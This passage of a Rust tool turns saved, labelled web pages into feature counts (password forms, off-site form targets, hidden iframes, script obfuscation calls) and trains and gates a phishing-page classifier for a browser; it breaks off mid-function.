//! Trains Rift AI's page model (docs/architecture.md §16.1) on saved pages.
//!
//!   page counts <index.sql|index.tsv> <pages-dir> <out.tsv>
//!   page train <out-model> --counts FILE[:WEIGHT]... [--recent FILE[:WEIGHT]] [--champion MODEL] [--words on|off] [--trees N]
//!
//! `counts` reads each page as text (an HTML5 parser; no scripts run) and
//! writes what the browser's script counts in a live one (`PAGE_COUNTS` in
//! BrowserActivity.kt): one `label<TAB>url<TAB>report` line per page, the
//! report being the JSON the app receives. The index is the Phishing
//! Websites Dataset's `index.sql` (Ariyadasa, Fernando and Fernando,
//! Mendeley Data, 2021, CC BY 4.0) or the `index.tsv` that
//! `fetch_pages.py` writes for the monthly retrain's fresh pages.
//!
//! `train` reads counts, turns them into features with
//! `rift_core::pagemodel::features`, the code the app runs, and trains.
//! Splits are by site (80/10/10), so the test measures sites the model never
//! saw. The L2 strength is chosen on validation, thresholds are set there
//! (High at 0.5% of legitimate pages, Elevated at 2%, each page counting by its
//! weight, so recent pages set them), and the test split is
//! scored with `PageModel`, as the app scores. With `--recent` and
//! `--champion`, the recent pages' test split is the gate's: the new model
//! is written only if it does as well there as the shipped one (`gate`).
//! The model reads the page's words as well as its counts, and adds boosted
//! trees over the counts (3.3); `--words off --trees 0` trains the plain
//! regression of 3.0.
//!
//! `eval` scores counts with a model as the app does, all of them: for pages
//! no model trained on, such as those gathered after it was trained.
//!
//! An offline maintainer tool over files the maintainer chose.
#![allow(clippy::indexing_slicing, clippy::arithmetic_side_effects)]

use std::collections::hash_map::DefaultHasher;
use std::fs;
use std::hash::{Hash, Hasher};
use std::path::Path;
use std::process::ExitCode;

use rift_core::pagemodel::{self, FEATURES, PageCounts, PageLevel, PageModel, site_key};
use scraper::{ElementRef, Html, Node};
use url::Url;

/// Pages larger than this are cut, as no live page script reads more.
const MAX_HTML_BYTES: usize = 4 * 1024 * 1024;

struct Row {
    url: String,
    file: String,
    phishing: bool,
}

/// The `(rec_id, 'url', 'file', result, 'date')` tuples of the dump.
fn rows(sql: &str) -> Vec<Row> {
    let mut out = Vec::new();
    let mut fields: Vec<String> = Vec::new();
    let mut field = String::new();
    let mut in_tuple = false;
    let mut quoted = false;
    let mut chars = sql.chars();
    while let Some(c) = chars.next() {
        if quoted {
            match c {
                '\\' => {
                    if let Some(next) = chars.next() {
                        field.push(next);
                    }
                }
                '\'' => quoted = false,
                _ => field.push(c),
            }
            continue;
        }
        match c {
            '(' if !in_tuple => {
                in_tuple = true;
                fields.clear();
                field.clear();
            }
            '\'' if in_tuple => quoted = true,
            ',' if in_tuple => fields.push(std::mem::take(&mut field).trim().to_owned()),
            ')' if in_tuple => {
                fields.push(std::mem::take(&mut field).trim().to_owned());
                in_tuple = false;
                if let [_, url, file, result, ..] = fields.as_slice()
                    && (result.trim() == "0" || result.trim() == "1")
                {
                    out.push(Row {
                        url: url.clone(),
                        file: file.clone(),
                        phishing: result.trim() == "1",
                    });
                }
            }
            _ if in_tuple => field.push(c),
            _ => {}
        }
    }
    out
}

fn nowhere(v: &str) -> bool {
    let v = v.trim().to_lowercase();
    v.is_empty() || v.starts_with('#') || v.starts_with("javascript:") || v == "about:blank"
}

struct Page<'a> {
    base: &'a Url,
    me: String,
}

impl Page<'_> {
    fn other(&self, v: Option<&str>) -> bool {
        let Some(v) = v.filter(|v| !v.is_empty()) else {
            return false;
        };
        self.base.join(v.trim()).is_ok_and(|u| {
            matches!(u.scheme(), "http" | "https")
                && u.host_str().is_some_and(|h| site_key(h) != self.me)
        })
    }
}

/// Visible text: the body's text nodes outside scripts, styles and templates.
fn visible_text(element: ElementRef<'_>, out: &mut String) {
    for child in element.children() {
        match child.value() {
            Node::Text(text) => {
                out.push_str(text);
                out.push(' ');
            }
            Node::Element(e) => {
                if matches!(
                    e.name(),
                    "script" | "style" | "noscript" | "template" | "head"
                ) {
                    continue;
                }
                if let Some(child) = ElementRef::wrap(child) {
                    visible_text(child, out);
                }
            }
            _ => {}
        }
        if out.len() > 200_000 {
            return;
        }
    }
}

/// The counts the browser's script makes, from saved HTML.
fn count(url: &Url, html: &str) -> PageCounts {
    let doc = Html::parse_document(html);
    let page = Page {
        base: url,
        me: site_key(url.host_str().unwrap_or_default()),
    };
    let mut k = PageCounts::default();
    let obfuscation = [
        "eval(",
        "atob(",
        "unescape(",
        "fromCharCode",
        "document.write(",
    ];
    for node in doc.tree.nodes() {
        let Some(el) = ElementRef::wrap(node) else {
            continue;
        };
        let e = el.value();
        k.el += 1;
        if e.attr("oncontextmenu").is_some() {
            k.rc = 1;
        }
        match e.name() {
            "input" => match e.attr("type").map(str::to_ascii_lowercase).as_deref() {
                Some("password") => k.pw += 1,
                Some("hidden") => k.hi += 1,
                _ => {}
            },
            "form" => {
                k.fm += 1;
                if let Some(v) = e.attr("action") {
                    if nowhere(v) {
                        k.fnull += 1;
                    } else {
                        let v = v.trim().to_lowercase();
                        if v.starts_with("mailto:") {
                            k.fmail += 1;
                        } else if page.other(Some(&v)) {
                            k.fx += 1;
                        }
                        let path = v.split(['?', '#']).next().unwrap_or_default();
                        if path.ends_with(".php") {
                            k.fphp += 1;
                        }
                    }
                }
            }
            "a" => {
                if let Some(v) = e.attr("href") {
                    k.a += 1;
                    if nowhere(v) {
                        k.an += 1;
                    } else if page.other(Some(v)) {
                        k.ax += 1;
                    }
                }
            }
            "meta"
                if e.attr("http-equiv")
                    .is_some_and(|v| v.eq_ignore_ascii_case("refresh")) =>
            {
                k.mr = 1;
            }
            _ => {}
        }
        let name = e.name();
        let resource = match name {
            "img" | "script" | "iframe" => e.attr("src"),
            "link" => e.attr("href"),
            _ => None,
        };
        if let Some(v) = resource {
            k.r += 1;
            if page.other(Some(v)) {
                k.rx += 1;
            }
        }
        if name == "link"
            && e.attr("rel").is_some_and(|rel| {
                rel.split_ascii_whitespace()
                    .any(|t| t.eq_ignore_ascii_case("icon"))
            })
            && page.other(e.attr("href"))
        {
            k.fv = 1;
        }
        if name == "iframe" || name == "frame" {
            k.ifr += 1;
            let style = e
                .attr("style")
                .unwrap_or_default()
                .to_lowercase()
                .replace(' ', "");
            if e.attr("width") == Some("0")
                || e.attr("height") == Some("0")
                || e.attr("hidden").is_some()
                || style.contains("display:none")
                || style.contains("visibility:hidden")
            {
                k.ih += 1;
            }
        }
        if name == "script" {
            k.sc += 1;
            if let Some(v) = e.attr("src") {
                if page.other(Some(v)) {
                    k.sx += 1;
                }
            } else {
                let text: String = el
                    .text()
                    .collect::<String>()
                    .chars()
                    .take(200_000)
                    .collect();
                for token in obfuscation {
                    k.ob += u32::try_from(text.matches(token).count()).unwrap_or(u32::MAX);
                }
                let squashed = text.replace(' ', "");
                if squashed.contains("event.button==2") {
                    k.rc = 1;
                }
            }
        }
    }
    k.hb = u32::try_from(html.chars().count()).unwrap_or(u32::MAX);
    let first = |tag: &str| {
        doc.tree
            .nodes()
            .filter_map(ElementRef::wrap)
            .find(|e| e.value().name() == tag)
    };
    if let Some(title) = first("title") {
        k.title = title
            .text()
            .collect::<String>()
            .split_whitespace()
            .collect::<Vec<_>>()
            .join(" ");
    }
    let mut text = String::new();
    if let Some(body) = first("body") {
        visible_text(body, &mut text);
    }
    let text = text.split_whitespace().collect::<Vec<_>>().join(" ");
    k.cp = u32::from(text.contains(['\u{a9}', '\u{ae}', '\u{2122}']));
    k.text = text;
    k.bound();
    k
}

fn split_of(site: &str) -> u8 {
    let mut h = DefaultHasher::new();
    site.hash(&mut h);
    (h.finish() % 10) as u8
}

struct Example {
    x: Vec<f32>,
    /// The page's words that are in the vocabulary, as its indices.
    words: Vec<u32>,
    y: f32,
    /// How much the page counts in training.
    w: f32,
}

fn sigmoid(z: f32) -> f32 {
    1.0 / (1.0 + (-z).exp())
}

/// Logistic regression on standardised features and the page's words
/// (0 or 1 each), full-batch gradient descent with Adam; returns the
/// feature weights (last is the bias) and the words' weights.
fn train(
    data: &[Example],
    mean: &[f32],
    std: &[f32],
    vocabulary: usize,
    l2: f32,
    epochs: usize,
) -> (Vec<f32>, Vec<f32>) {
    let d = mean.len();
    let all = d + 1 + vocabulary;
    let mut w = vec![0.0f32; all];
    let (mut m, mut v) = (vec![0.0f32; all], vec![0.0f32; all]);
    let (b1, b2, lr) = (0.9f32, 0.999f32, 0.05f32);
    let n: f32 = data.iter().map(|e| e.w).sum::<f32>().max(1.0);
    for t in 1..=epochs {
        let mut g = vec![0.0f32; all];
        for ex in data {
            let mut z = w[d];
            for j in 0..d {
                z += w[j] * (ex.x[j] - mean[j]) / std[j];
            }
            for &k in &ex.words {
                z += w[d + 1 + k as usize];
            }
            let err = ex.w * (sigmoid(z) - ex.y);
            for j in 0..d {
                g[j] += err * (ex.x[j] - mean[j]) / std[j];
            }
            g[d] += err;
            for &k in &ex.words {
                g[d + 1 + k as usize] += err;
            }
        }
        for j in 0..all {
            let grad = g[j] / n + if j == d { 0.0 } else { l2 * w[j] };
            m[j] = b1 * m[j] + (1.0 - b1) * grad;
            v[j] = b2 * v[j] + (1.0 - b2) * grad * grad;
            let mh = m[j] / (1.0 - b1.powi(t as i32));
            let vh = v[j] / (1.0 - b2.powi(t as i32));
            w[j] -= lr * mh / (vh.sqrt() + 1e-8);
        }
    }
    let words = w.split_off(d + 1);
    (w, words)
}

/// Words in at least this many training pages may join the vocabulary.
const MIN_WORD_PAGES: usize = 20;
/// Most words considered in training; the model keeps at most
/// `pagemodel::MAX_WORDS` of them, those of most weight.
const MAX_VOCABULARY: usize = 20_000;
/// Most trees tried; the model keeps as many as do best on validation.
const MAX_TREES: usize = 300;
/// Each tree's step (shrinkage).
const TREE_RATE: f32 = 0.1;
/// Words weighing less than this are left out of the model.
const MIN_WORD_WEIGHT: f32 = 0.05;

/// The vocabulary: words in at least [`MIN_WORD_PAGES`] training pages,
/// the most common first, at most [`MAX_VOCABULARY`].
fn vocabulary<'a>(pages: impl Iterator<Item = &'a [String]>) -> Vec<String> {
    let mut seen: std::collections::HashMap<&str, usize> = std::collections::HashMap::new();
    for words in pages {
        for w in words {
            *seen.entry(w.as_str()).or_default() += 1;
        }
    }
    let mut common: Vec<(&str, usize)> = seen
        .into_iter()
        .filter(|(_, n)| *n >= MIN_WORD_PAGES)
        .collect();
    common.sort_by(|a, b| b.1.cmp(&a.1).then(a.0.cmp(b.0)));
    common.truncate(MAX_VOCABULARY);
    common.into_iter().map(|(w, _)| w.to_owned()).collect()
}

/// Gradient boosting (logistic loss) of depth-3 trees on the features,
/// starting from each page's `base` log-odds: what the regression cannot
/// express, such as a password form that also sends to another site.
mod boost {
    use super::{Example, sigmoid};
    use rift_core::pagemodel::{TREE_LEAVES, TREE_SPLITS};

    /// Candidate thresholds per feature, and the most of them.
    const BINS: usize = 64;
    const LAMBDA: f32 = 1.0;
    /// Fewest pages (by weight of the Hessian) a leaf must have.
    const MIN_HESSIAN: f32 = 5.0;

    pub struct Tree {
        pub features: [usize; TREE_SPLITS],
        pub thresholds: [f32; TREE_SPLITS],
        pub values: [f32; TREE_SPLITS],
        pub leaves: [f32; TREE_LEAVES],
    }

    impl Tree {
        pub fn eval(&self, x: &[f32]) -> f32 {
            let mut node = 0;
            while node < TREE_SPLITS {
                node = 2 * node
                    + if x[self.features[node]] < self.thresholds[node] {
                        1
                    } else {
                        2
                    };
            }
            self.leaves[node - TREE_SPLITS]
        }

        /// The model file's line (pagemodel's `Tree::parse`).
        pub fn line(&self, names: &[&str]) -> String {
            let mut out = String::from("tree");
            for i in 0..TREE_SPLITS {
                out.push_str(&format!(
                    " {} {} {}",
                    names[self.features[i]], self.thresholds[i], self.values[i]
                ));
            }
            for leaf in &self.leaves {
                out.push_str(&format!(" {leaf}"));
            }
            out
        }
    }

    /// Thresholds per feature: quantiles of the training values.
    pub fn edges(data: &[Example], d: usize) -> Vec<Vec<f32>> {
        (0..d)
            .map(|j| {
                let mut v: Vec<f32> = data.iter().map(|e| e.x[j]).collect();
                v.sort_by(f32::total_cmp);
                v.dedup();
                if v.len() <= BINS {
                    // Between each pair of values.
                    v.windows(2).map(|p| (p[0] + p[1]) / 2.0).collect()
                } else {
                    let mut e: Vec<f32> = (1..BINS)
                        .map(|k| {
                            let at = k * v.len() / BINS;
                            (v[at - 1] + v[at]) / 2.0
                        })
                        .collect();
                    e.dedup();
                    e
                }
            })
            .collect()
    }

    /// Each page's bin per feature: how many thresholds its value reaches.
    pub fn bin(data: &[Example], edges: &[Vec<f32>]) -> Vec<Vec<u8>> {
        data.iter()
            .map(|e| {
                edges
                    .iter()
                    .enumerate()
                    .map(|(j, ed)| ed.partition_point(|t| *t <= e.x[j]) as u8)
                    .collect()
            })
            .collect()
    }

    fn value(g: f32, h: f32, eta: f32) -> f32 {
        -eta * g / (h + LAMBDA)
    }

    /// One tree, fitted to the gradients `g` and Hessians `h`.
    pub fn grow(bins: &[Vec<u8>], edges: &[Vec<f32>], g: &[f32], h: &[f32], eta: f32) -> Tree {
        let d = edges.len();
        let mut tree = Tree {
            features: [0; TREE_SPLITS],
            thresholds: [f32::MAX; TREE_SPLITS],
            values: [0.0; TREE_SPLITS],
            leaves: [0.0; TREE_LEAVES],
        };
        // Which node each page is at.
        let mut at = vec![0usize; bins.len()];
        for node in 0..TREE_SPLITS {
            let (mut gs, mut hs) = (0.0f32, 0.0f32);
            let mut hist_g = vec![vec![0.0f32; super::boost::BINS + 1]; d];
            let mut hist_h = vec![vec![0.0f32; super::boost::BINS + 1]; d];
            for (i, b) in bins.iter().enumerate() {
                if at[i] != node {
                    continue;
                }
                gs += g[i];
                hs += h[i];
                for j in 0..d {
                    hist_g[j][b[j] as usize] += g[i];
                    hist_h[j][b[j] as usize] += h[i];
                }
            }
            tree.values[node] = value(gs, hs, eta);
            let parent = gs * gs / (hs + LAMBDA);
            let mut best: Option<(f32, usize, usize)> = None;
            for j in 0..d {
                let (mut gl, mut hl) = (0.0f32, 0.0f32);
                for k in 0..edges[j].len() {
                    gl += hist_g[j][k];
                    hl += hist_h[j][k];
                    let (gr, hr) = (gs - gl, hs - hl);
                    if hl < MIN_HESSIAN || hr < MIN_HESSIAN {
                        continue;
                    }
                    let gain = gl * gl / (hl + LAMBDA) + gr * gr / (hr + LAMBDA) - parent;
                    if gain > 1e-6 && best.is_none_or(|(b, _, _)| gain > b) {
                        best = Some((gain, j, k));
                    }
                }
            }
            // No split worth making: all pages go left, both children alike.
            let (j, k) = best.map_or((0, usize::MAX), |(_, j, k)| (j, k));
            tree.features[node] = j;
            if k != usize::MAX {
                tree.thresholds[node] = edges[j][k];
            }
            for (i, b) in bins.iter().enumerate() {
                if at[i] == node {
                    at[i] = 2 * node + if (b[j] as usize) <= k { 1 } else { 2 };
                }
            }
        }
        let (mut lg, mut lh) = ([0.0f32; TREE_LEAVES], [0.0f32; TREE_LEAVES]);
        for i in 0..bins.len() {
            lg[at[i] - TREE_SPLITS] += g[i];
            lh[at[i] - TREE_SPLITS] += h[i];
        }
        for leaf in 0..TREE_LEAVES {
            // An empty leaf keeps its parent's value.
            let parent = (leaf + TREE_SPLITS - 1) / 2;
            tree.leaves[leaf] = if lh[leaf] > 0.0 {
                value(lg[leaf], lh[leaf], eta)
            } else {
                tree.values[parent]
            };
        }
        tree
    }

    /// Gradients and Hessians of the weighted logistic loss at log-odds `z`.
    pub fn gradients(data: &[Example], z: &[f32]) -> (Vec<f32>, Vec<f32>) {
        data.iter()
            .zip(z)
            .map(|(e, z)| {
                let p = sigmoid(*z);
                (e.w * (p - e.y), (e.w * p * (1.0 - p)).max(1e-6))
            })
            .unzip()
    }
}

/// Folds standardisation into the weights: (raw weights, raw bias).
fn fold(w: &[f32], mean: &[f32], std: &[f32]) -> (Vec<f32>, f32) {
    let d = mean.len();
    let raw: Vec<f32> = (0..d).map(|j| w[j] / std[j]).collect();
    let bias = w[d] - (0..d).map(|j| w[j] * mean[j] / std[j]).sum::<f32>();
    (raw, bias)
}

fn auc(s: &[(f32, bool)]) -> f64 {
    let mut s = s.to_vec();
    s.sort_by(|a, b| a.0.total_cmp(&b.0));
    let (mut rank_sum, mut pos) = (0.0f64, 0.0f64);
    for (i, (_, p)) in s.iter().enumerate() {
        if *p {
            rank_sum += (i + 1) as f64;
            pos += 1.0;
        }
    }
    let neg = s.len() as f64 - pos;
    (rank_sum - pos * (pos + 1.0) / 2.0) / (pos * neg)
}

/// The lowest score that flags at most `fpr` of the legitimate pages, by
/// weight (`w`, in `s`'s order): recent pages count as they do in training,
/// so the thresholds are set mostly by the pages of today.
fn threshold(s: &[(f32, bool)], w: &[f32], fpr: f64) -> f32 {
    let mut neg: Vec<(f32, f32)> = s
        .iter()
        .zip(w)
        .filter(|((_, p), _)| !p)
        .map(|((x, _), w)| (*x, *w))
        .collect();
    neg.sort_by(|a, b| b.0.total_cmp(&a.0));
    let allowed = neg.iter().map(|n| f64::from(n.1)).sum::<f64>() * fpr;
    let mut flagged = 0.0;
    for (x, w) in &neg {
        flagged += f64::from(*w);
        if flagged > allowed {
            return (x + 1e-6).min(1.0);
        }
    }
    1.0
}

/// Weighted shares of phishing and legitimate pages at `t` or above.
fn rates(s: &[(f32, bool)], w: &[f32], t: f32) -> (f64, f64) {
    let share = |phishing: bool| {
        let (mut all, mut over) = (0.0f64, 0.0f64);
        for ((x, p), w) in s.iter().zip(w) {
            if *p == phishing {
                all += f64::from(*w);
                if *x >= t {
                    over += f64::from(*w);
                }
            }
        }
        over / all.max(1e-9)
    };
    (share(true), share(false))
}

/// One counted page: its address, label and the counts the app would see.
struct Counted {
    host: String,
    phishing: bool,
    counts: PageCounts,
}

/// `index.sql` (the dataset's dump) or `index.tsv` (`fetch_pages.py`:
/// `url<TAB>file<TAB>label` lines).
fn index(path: &str, text: &str) -> Vec<Row> {
    if !path.ends_with(".tsv") {
        return rows(text);
    }
    text.lines()
        .filter_map(|line| {
            let mut f = line.split('\t');
            let (url, file, label) = (f.next()?, f.next()?, f.next()?);
            matches!(label, "0" | "1").then(|| Row {
                url: url.to_owned(),
                file: file.to_owned(),
                phishing: label == "1",
            })
        })
        .collect()
}

/// `counts <index> <pages-dir> <out.tsv>`: each page as
/// `label<TAB>url<TAB>counts JSON`, the report the page script sends.
fn counts_cmd(args: &[String]) -> ExitCode {
    let [index_path, dir, out_path] = args else {
        eprintln!("usage: page counts <index.sql|index.tsv> <pages-dir> <out.tsv>");
        return ExitCode::FAILURE;
    };
    let text = match fs::read(index_path) {
        Ok(b) => String::from_utf8_lossy(&b).into_owned(),
        Err(e) => {
            eprintln!("page: {index_path}: {e}");
            return ExitCode::FAILURE;
        }
    };
    let (mut out, mut missing) = (String::new(), 0usize);
    let mut written = 0usize;
    for row in index(index_path, &text) {
        let Ok(url) = Url::parse(row.url.trim()) else {
            continue;
        };
        if url.host_str().is_none() || row.url.contains(['\t', '\n']) {
            continue;
        }
        let Ok(bytes) = fs::read(Path::new(dir).join(&row.file)) else {
            missing += 1;
            continue;
        };
        let bytes = &bytes[..bytes.len().min(MAX_HTML_BYTES)];
        let counts = count(&url, &String::from_utf8_lossy(bytes));
        let Ok(json) = serde_json::to_string(&counts) else {
            continue;
        };
        out.push_str(&format!("{}\t{}\t{json}\n", u8::from(row.phishing), url));
        written += 1;
        if written.is_multiple_of(5000) {
            eprintln!("page: {written} pages counted");
        }
    }
    eprintln!("page: {written} pages counted ({missing} files missing)");
    if let Err(e) = fs::write(out_path, out) {
        eprintln!("page: {out_path}: {e}");
        return ExitCode::FAILURE;
    }
    ExitCode::SUCCESS
}

/// Reads a counts file; a malformed line is skipped, as a report would be.
fn read_counts(path: &str) -> Result<Vec<Counted>, String> {
    let text = fs::read_to_string(path).map_err(|e| format!("{path}: {e}"))?;
    Ok(text
        .lines()
        .filter_map(|line| {
            let mut f = line.splitn(3, '\t');
            let (label, url, json) = (f.next()?, f.next()?, f.next()?);
            let host = Url::parse(url).ok()?.host_str()?.to_owned();
            Some(Counted {
                host,
                phishing: match label {
                    "1" => true,
                    "0" => false,
                    _ => return None,
                },
                counts: PageCounts::from_report(json)?,
            })
        })
        .collect())
}

fn split_index(host: &str) -> usize {
    match split_of(&site_key(host)) {
        0..=7 => 0,
        8 => 1,
        _ => 2,
    }
}

/// What a model does on a set of pages.
struct Measured {
    pages: usize,
    auc: f64,
    high: (f64, f64),
    elevated: (f64, f64),
}

fn measure(model: &PageModel, pages: &[&Counted]) -> Measured {
    let (mut s, mut levels) = (Vec::new(), Vec::new());
    for p in pages {
        let score = model.score(&p.host, &p.counts);
        s.push((score.score, p.phishing));
        levels.push((score.level, p.phishing));
    }
    let rate = |min: PageLevel| {
        let pos = levels.iter().filter(|(_, p)| *p).count().max(1) as f64;
        let neg = levels.iter().filter(|(_, p)| !p).count().max(1) as f64;
        let tp = levels.iter().filter(|(l, p)| *p && *l >= min).count() as f64;
        let fp = levels.iter().filter(|(l, p)| !*p && *l >= min).count() as f64;
        (tp / pos, fp / neg)
    };
    Measured {
        pages: pages.len(),
        auc: auc(&s),
        high: rate(PageLevel::High),
        elevated: rate(PageLevel::Elevated),
    }
}

fn describe(m: &Measured) -> String {
    format!(
        "{} pages, AUC {:.4}; High: {:.1}% of phishing, {:.2}% of legitimate; Elevated or High: {:.1}% of phishing, {:.2}% of legitimate",
        m.pages,
        m.auc,
        m.high.0 * 100.0,
        m.high.1 * 100.0,
        m.elevated.0 * 100.0,
        m.elevated.1 * 100.0
    )
}

/// Fewest pages of each label in the recent test split for the gate to judge.
const GATE_MIN_PAGES: usize = 150;

/// The gate (docs/reports/page-model.md, "Learning from new pages"): on the
/// recent pages of sites no model trained on, the new model may not raise
/// more false alarms at High than 1%, nor more than the shipped model by
/// 0.25 points, nor catch fewer phishing pages at High, nor lose AUC.
fn gate(new: &Measured, shipped: &Measured, phishing: usize, legit: usize) -> Vec<String> {
    let mut refused = Vec::new();
    if phishing < GATE_MIN_PAGES || legit < GATE_MIN_PAGES {
        refused.push(format!(
            "too few recent pages to judge: {phishing} phishing and {legit} legitimate, at least {GATE_MIN_PAGES} of each needed"
        ));
    }
    if new.high.1 > 0.01 || new.high.1 > shipped.high.1 + 0.0025 {
        refused.push(format!(
            "{:.2}% of recent legitimate pages at High, against the shipped model's {:.2}%",
            new.high.1 * 100.0,
            shipped.high.1 * 100.0
        ));
    }
    if new.high.0 + 1e-9 < shipped.high.0 {
        refused.push(format!(
            "{:.1}% of recent phishing pages at High, against the shipped model's {:.1}%",
            new.high.0 * 100.0,
            shipped.high.0 * 100.0
        ));
    }
    if new.auc + 0.002 < shipped.auc {
        refused.push(format!(
            "AUC {:.4} on recent pages, against the shipped model's {:.4}",
            new.auc, shipped.auc
        ));
    }
    refused
}

/// `train <out-model> --counts FILE[:WEIGHT]... [--recent FILE] [--champion MODEL] [--words on|off] [--trees N]`
fn train_cmd(args: &[String]) -> ExitCode {
    let Some(out_path) = args.first() else {
        eprintln!(
            "usage: page train <out-model> --counts FILE[:WEIGHT]... [--recent FILE[:WEIGHT]] [--champion MODEL] [--words on|off] [--trees N]"
        );
        return ExitCode::FAILURE;
    };
    let mut sources: Vec<(String, f32, bool)> = Vec::new();
    let mut champion = None;
    let mut use_words = true;
    let mut max_trees = MAX_TREES;
    let mut it = args[1..].iter();
    while let Some(flag) = it.next() {
        let Some(value) = it.next() else {
            eprintln!("page: {flag} needs a value");
            return ExitCode::FAILURE;
        };
        match flag.as_str() {
            "--counts" | "--recent" => {
                let (path, weight) = match value.rsplit_once(':') {
                    Some((p, w)) if w.parse::<f32>().is_ok_and(|w| w > 0.0) => {
                        (p.to_owned(), w.parse().unwrap_or(1.0))
                    }
                    _ => (value.clone(), 1.0),
                };
                sources.push((path, weight, flag == "--recent"));
            }
            "--champion" => champion = Some(value.clone()),
            "--words" => use_words = value != "off",
            "--trees" => match value.parse() {
                Ok(n) => max_trees = n,
                Err(_) => {
                    eprintln!("page: --trees needs a number");
                    return ExitCode::FAILURE;
                }
            },
            _ => {
                eprintln!("page: unknown option {flag}");
                return ExitCode::FAILURE;
            }
        }
    }
    // Every page, with its weight, whether it is recent, and its split.
    let mut pages: Vec<(Counted, f32, bool, usize)> = Vec::new();
    for (path, weight, recent) in &sources {
        match read_counts(path) {
            Ok(rows) => {
                eprintln!("page: {path}: {} pages, weight {weight}", rows.len());
                for c in rows {
                    let split = split_index(&c.host);
                    pages.push((c, *weight, *recent, split));
                }
            }
            Err(e) => {
                eprintln!("page: {e}");
                return ExitCode::FAILURE;
            }
        }
    }
    // The words of every page, once; the vocabulary from the training split.
    let page_words: Vec<Vec<String>> = pages
        .iter()
        .map(|p| pagemodel::words(&p.0.counts))
        .collect();
    let vocab: Vec<String> = if use_words {
        vocabulary(
            pages
                .iter()
                .zip(&page_words)
                .filter(|(p, _)| p.3 == 0)
                .map(|(_, w)| w.as_slice()),
        )
    } else {
        Vec::new()
    };
    let index: std::collections::HashMap<&str, u32> = vocab
        .iter()
        .enumerate()
        .map(|(i, w)| (w.as_str(), i as u32))
        .collect();
    let examples = |split: usize| -> Vec<Example> {
        pages
            .iter()
            .zip(&page_words)
            .filter(|(p, _)| p.3 == split)
            .map(|((c, w, _, _), words)| Example {
                x: pagemodel::features(&c.host, &c.counts),
                words: words
                    .iter()
                    .filter_map(|w| index.get(w.as_str()).copied())
                    .collect(),
                y: if c.phishing { 1.0 } else { 0.0 },
                w: *w,
            })
            .collect()
    };
    let (train_set, valid) = (examples(0), examples(1));
    eprintln!(
        "page: {} pages: train {}, validation {}; {} words",
        pages.len(),
        train_set.len(),
        valid.len(),
        vocab.len()
    );
    let d = FEATURES.len();
    let n: f32 = train_set.iter().map(|e| e.w).sum::<f32>().max(1.0);
    let mean: Vec<f32> = (0..d)
        .map(|j| train_set.iter().map(|e| e.w * e.x[j]).sum::<f32>() / n)
        .collect();
    let std: Vec<f32> = (0..d)
        .map(|j| {
            let var = train_set
                .iter()
                .map(|e| e.w * (e.x[j] - mean[j]).powi(2))
                .sum::<f32>()
                / n;
            var.sqrt().max(1e-3)
        })
        .collect();
    // The regression's log-odds for a page, with the words the model keeps.
    let linear = |raw: &[f32], bias: f32, words: &[f32], ex: &Example| -> f32 {
        let z = raw.iter().zip(&ex.x).fold(bias, |z, (w, x)| z + w * x);
        z + ex.words.iter().map(|k| words[*k as usize]).sum::<f32>()
    };
    let vw: Vec<f32> = valid.iter().map(|e| e.w).collect();
    let recall = |s: &[(f32, bool)]| rates(s, &vw, threshold(s, &vw, 0.005)).0;
    let mut best: Option<(f64, f32, Vec<f32>, Vec<f32>)> = None;
    for l2 in [1e-4f32, 1e-3, 1e-2] {
        let (w, words) = train(&train_set, &mean, &std, vocab.len(), l2, 400);
        let (raw, bias) = fold(&w, &mean, &std);
        let s: Vec<(f32, bool)> = valid
            .iter()
            .map(|ex| (sigmoid(linear(&raw, bias, &words, ex)), ex.y > 0.5))
            .collect();
        let tpr = recall(&s);
        eprintln!(
            "page: l2 {l2}: validation AUC {:.4}, recall at 0.5% false alarms {:.3}",
            auc(&s),
            tpr
        );
        if best.as_ref().is_none_or(|(b, _, _, _)| tpr > *b) {
            best = Some((tpr, l2, w, words));
        }
    }
    let Some((_, l2, w, mut word_weights)) = best else {
        return ExitCode::FAILURE;
    };
    // The words the model keeps: those of most weight, at most MAX_WORDS.
    let mut kept: Vec<usize> = (0..vocab.len())
        .filter(|k| word_weights[*k].abs() >= MIN_WORD_WEIGHT)
        .collect();
    kept.sort_by(|a, b| word_weights[*b].abs().total_cmp(&word_weights[*a].abs()));
    kept.truncate(pagemodel::MAX_WORDS);
    let keep: std::collections::HashSet<usize> = kept.iter().copied().collect();
    for (k, weight) in word_weights.iter_mut().enumerate() {
        if !keep.contains(&k) {
            *weight = 0.0;
        }
    }
    let (raw, bias) = fold(&w, &mean, &std);
    // Trees on what the regression leaves, as many as do best on validation.
    let mut trees: Vec<boost::Tree> = Vec::new();
    if max_trees > 0 {
        let edges = boost::edges(&train_set, d);
        let bins = boost::bin(&train_set, &edges);
        let mut z: Vec<f32> = train_set
            .iter()
            .map(|ex| linear(&raw, bias, &word_weights, ex))
            .collect();
        let mut zv: Vec<f32> = valid
            .iter()
            .map(|ex| linear(&raw, bias, &word_weights, ex))
            .collect();
        let score_valid = |zv: &[f32]| -> Vec<(f32, bool)> {
            zv.iter()
                .zip(&valid)
                .map(|(z, ex)| (sigmoid(*z), ex.y > 0.5))
                .collect()
        };
        let mut best_recall = recall(&score_valid(&zv));
        let mut best_count = 0;
        eprintln!("page: no trees: validation recall at 0.5% false alarms {best_recall:.3}");
        for t in 1..=max_trees {
            let (g, h) = boost::gradients(&train_set, &z);
            let tree = boost::grow(&bins, &edges, &g, &h, TREE_RATE);
            for (zi, ex) in z.iter_mut().zip(&train_set) {
                *zi += tree.eval(&ex.x);
            }
            for (zi, ex) in zv.iter_mut().zip(&valid) {
                *zi += tree.eval(&ex.x);
            }
            trees.push(tree);
            if t % 10 == 0 {
                let s = score_valid(&zv);
                let r = recall(&s);
                eprintln!(
                    "page: {t} trees: validation AUC {:.4}, recall at 0.5% false alarms {r:.3}",
                    auc(&s)
                );
                if r > best_recall {
                    best_recall = r;
                    best_count = t;
                }
            }
        }
        trees.truncate(best_count);
        eprintln!("page: {best_count} trees kept");
    }
    let total = |ex: &Example| -> f32 {
        linear(&raw, bias, &word_weights, ex) + trees.iter().map(|t| t.eval(&ex.x)).sum::<f32>()
    };
    let s: Vec<(f32, bool)> = valid
        .iter()
        .map(|ex| (sigmoid(total(ex)), ex.y > 0.5))
        .collect();
    let high = threshold(&s, &vw, 0.005);
    let elevated = threshold(&s, &vw, 0.02).min(high);
    // Means of legitimate training pages: what the reasons compare against.
    let legit: Vec<&Example> = train_set.iter().filter(|e| e.y < 0.5).collect();
    let ln = legit.len().max(1) as f32;
    let words_mean = legit
        .iter()
        .map(|e| {
            e.words
                .iter()
